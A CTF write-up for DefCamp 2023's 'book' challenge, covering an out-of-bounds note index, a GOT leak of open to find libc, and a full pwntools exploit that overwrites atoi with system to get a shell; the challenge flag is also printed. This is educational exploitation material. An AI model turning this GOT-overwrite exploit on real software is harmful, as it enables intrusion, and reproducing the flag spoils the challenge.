## Challenge Description

Read books for inspiration so you know what to write!

Flag format: CTF{sha256}

### Intuition

Checksec the binary to see what we have.

```  
$ checksec book  
LIBC_FILE=/lib/x86_64-linux-gnu/libc.so.6  
RELRO           STACK CANARY      NX            PIE             RPATH
RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE  
Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No
RUNPATH   74 Symbols        No    0               4               book  
```  
We have PIE enabled but Partial RELRO. Partial RELRO might mean that we will
overwrite GOT entries.

We decompile the binary and find a missing lower bound check for the index of
the entry we read/write. We have arbitrary read/write primitives before the
address of the todos list. Luckily, the GOT entries are before it. The main
idea would be to leak a libc address, find the libc version and overwrite a
function with ``system``.

### Solution

We can only leak an arbitrary amount of bytes, until a null byte is found,
with the ``printf`` found in ``print_todo``.

```c  
void print_todo(void)

{  
 int iVar1;  
  
 printf("Which entry would you like to read? ");  
 fflush(stdout);  
 iVar1 = read_int();  
 if (iVar1 < 0x81) {  
   printf("Your NOTE: %s\n",todos + iVar1 * 0x30);  
 }  
 else {  
   puts("Sorry but this model only supports 128 NOTE list entries.\n");  
 }  
 return;  
}  
```  
The catch is, we can only read at offsets of ``0x30`` bytes from the beginning
of the ``todos``. Luckily it is perfectly aligned with some GOT functions, but
the ``"%s"`` format string will run into some issues if it finds the null
byte. We choose to leak open as it is perfectly aligned at an offset of ``-4 *
0x30``. We get the address, determine the libc version manually using [libc
database](https://libc.blukat.me/) and then determine the offset to ``system``
from ``open``. Luckily we only need the lower 3 bytes of the address from the
leak, so the ``"%s"`` format won’t be too inconvenient.

We can use ``store_todo`` to write, again at offsets of ``0x30`` bytes from
``todos``. Below you can find a commented version of the exploit:

```py  
#!/usr/bin/env python3

from pwn import *

target = process("./book")  
#target = remote("34.89.131.150", 30325)

# Different offsets on local/remote  
is_remote = False  
if is_remote:  
   # libc6_2.31-0ubuntu9.9_amd64  
   system_offset = -0xbba50  
else:  
   system_offset = -801120

# Addresses found in .got.plt and .data  
# PIE is enabled but we write relative to todos address and it will be fine  
todos_addr = 0x00104140  
open_gotplt_addr = 0x00104080

# Function to transform offsets to indices for todos  
def get_offset_idx(addr):  
   return (addr - todos_addr) // 48

# Leak open address using arbitrary read primitive  
target.sendline(b"sunbather")  
target.sendline(b"2")  
idx = get_offset_idx(open_gotplt_addr)  
target.sendline(str(idx).encode())  
target.recvuntil(b"Your NOTE: ")  
leak = target.recvline().strip()  
print(hex(leak[0]), hex(leak[1]))

# somewhere here we can manually search for the libc version

# Determine system address  
open_addr = int.from_bytes(leak, byteorder="little")  
system_addr = open_addr + system_offset

# Write relative to todos  
idx = get_offset_idx(open_gotplt_addr)  
target.sendline(b"3")  
target.sendline(str(idx).encode())

# Overwrite GOT entry of atoi  
# atoi is right next to open, which means we use the previous open leak  
# to keep open intact  
leak = leak + b"\x00" * (8 - len(leak)) if len(leak) < 8 else leak # this is
just to make sure the leak has 8 bytes  
# then overwrite atoi with system  
payload = leak + p64(system_addr)

print(b"sending:" + payload)

# pop a shell ;)  
target.sendline(payload)  
target.interactive()  
```

An important thing to add is that we choose ``atoi`` not only because it is
easy to overwrite (right next to open), which allows us to keep the rest of
the addresses in GOT intact, but also because the next input we give to the
program will be directly passed to ``atoi``. Which means that if we replace it
with ``system`` we pretty much get a shell.

#### Flag

```CTF{33b9fc73cf5667ace669b51470f10addd390f3abc6101b366ce0eaf239846fc2}```

Original writeup (https://dothidden.xyz/defcamp_quals_2023/book/).